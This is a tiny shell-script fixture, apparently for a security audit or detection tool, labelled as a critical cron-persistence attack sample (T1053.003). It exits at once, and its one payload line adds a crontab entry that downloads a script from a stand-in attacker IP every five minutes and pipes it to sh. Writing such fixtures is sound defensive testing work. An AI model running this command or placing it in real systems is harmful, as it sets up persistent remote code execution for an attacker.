#!/bin/sh
exit 0 # a fixture: read by the audit, never run
# label: attack | technique: T1053.003 | expect: critical
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://203.0.113.5/c | sh") | crontab -
